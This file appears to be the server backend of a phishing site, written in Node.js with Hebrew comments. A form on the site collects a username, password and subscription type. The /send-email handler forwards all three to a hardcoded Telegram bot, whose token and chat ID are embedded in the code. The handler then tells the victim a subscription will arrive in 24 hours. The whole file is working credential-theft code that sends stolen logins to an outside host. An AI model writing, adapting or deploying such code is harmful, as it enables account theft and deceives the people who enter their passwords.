const express = require('express');
const bodyParser = require('body-parser');
const https = require('https');

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.json());

// מאפשר לשרת להציג קבצים כמו תמונות שנמצאים בתיקייה שלך
app.use(express.static(__dirname));

// הגדרות הבוט של טלגרם
const TELEGRAM_BOT_TOKEN = '8712536099:AAGnazkihREbhPJsGpgmAXOClVF3LSFneGg';
const TELEGRAM_CHAT_ID = '7519574690';

// פונקציה מרכזית ששולחת את ההודעה לטלגרם
function sendToTelegram(username, password, subscription, res) {
    const message = `🔐 תזכורת פרטי התחברות חדשים מהאתר:\n\n⭐ סוג מנוי: ${subscription}\n👤 שם משתמש: ${username}\n🔑 סיסמה: ${password}`;

    const data = JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message
    });

    const options = {
        hostname: 'api.telegram.org',
        port: 443,
        path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': data.length
        }
    };

    const telegramReq = https.request(options, (telegramRes) => {
        let responseBody = '';
        
        telegramRes.on('data', (chunk) => {
            responseBody += chunk;
        });

        telegramRes.on('end', () => {
            console.log('Telegram API response: ' + responseBody);
            if (res) {
                res.send('המנוי יתקבל בעוד 24 שעות');
            }
        });
    });

    telegramReq.on('error', (error) => {
        console.error('Telegram Error:', error);
        if (res) {
            res.send('שגיאה נסה שוב עוד 24 שעות');
        }
    });

    telegramReq.write(data);
    telegramReq.end();
}

// אומר לשרת להציג את קובץ ה-index.html כשנכנסים לאתר
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

// טיפול בבקשה שמגיעה מהטופס באתר
app.post('/send-email', (req, res) => {
    console.log('--> התקבלה בקשת שליחה חדשה מהאתר!');
    console.log('נתונים שהתקבלו:', req.body);

    const username = req.body.username || 'לא צויין';
    const password = req.body.password || 'לא צויין';
    const subscription = req.body.subscription || 'לא צויין';

    sendToTelegram(username, password, subscription, res);
});

// הפעלת השרת על הפורט של Render או פורט מקומי 3000
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
    console.log(`השרת פעיל בהצלחה בפורט ${PORT}`);
});
